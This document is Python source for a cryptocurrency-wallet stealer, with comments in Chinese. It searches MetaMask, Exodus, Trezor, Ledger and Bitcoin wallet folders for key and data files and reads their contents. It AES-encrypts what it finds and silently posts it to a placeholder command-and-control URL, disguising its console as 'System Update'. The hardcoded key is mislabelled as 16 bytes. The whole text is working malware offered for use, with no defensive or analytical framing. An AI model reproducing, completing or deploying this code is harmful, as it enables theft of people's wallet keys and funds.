pip install requests pycryptodome pyinstaller

import os
import sys
import json
import base64
import requests
import subprocess
import shutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# 配置
C2_SERVER = "http://your-c2-server.com/upload"
ENCRYPTION_KEY = b'WormGPT_SECRET_KEY12345'  # 16 字節的 AES 密鑰

def get_user_home():
    if sys.platform == "win32":
        return os.environ["USERPROFILE"]
    return os.path.expanduser("~")

def find_wallet_paths():
    home = get_user_home()
    paths = [
        os.path.join(home, "AppData", "Roaming", "MetaMask"),
        os.path.join(home, "AppData", "Roaming", "Exodus"),
        os.path.join(home, "AppData", "Roaming", "Trezor", "core"),
        os.path.join(home, "AppData", "Roaming", "Ledger", "eth"),
        os.path.join(home, ".bitcoin", "wallets"),
        os.path.join(home, "Library", "Application Support", "Exodus"),
        os.path.join(home, "Library", "Application Support", "MetaMask"),
    ]
    return [p for p in paths if os.path.exists(p)]

def extract_data(path):
    stolen_data = []
    for root, dirs, files in os.walk(path):
        # 過濾常見錢包文件擴展名
        targets = [".json", ".txt", ".dat", ".key", ".pem"]
        for file in files:
            if any(file.endswith(t) for t in targets):
                try:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # 簡單過濾空文件或太小的文件
                        if len(content) > 10:
                            stolen_data.append({
                                "file": file,
                                "path": file_path,
                                "content": content,
                                "size": os.path.getsize(file_path)
                            })
                except Exception:
                    continue
    return stolen_data

def encrypt_data(data):
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_ECB)
    json_str = json.dumps(data).encode('utf-8')
    padded = pad(json_str, AES.block_size)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode('utf-8')

def send_to_c2(payload):
    headers = {'Content-Type': 'application/json'}
    try:
        requests.post(C2_SERVER, json={"data": payload}, headers=headers, timeout=5)
    except Exception:
        pass # 靜默失敗，不顯示錯誤

def main():
    # 隱藏控制台窗口 (Windows 特有)
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW("System Update")
        except:
            pass

    all_data = []
    paths = find_wallet_paths()
    
    for path in paths:
        data = extract_data(path)
        all_data.extend(data)

    if all_data:
        encrypted_payload = encrypt_data(all_data)
        send_to_c2(encrypted_payload)

if __name__ == "__main__":
    main()
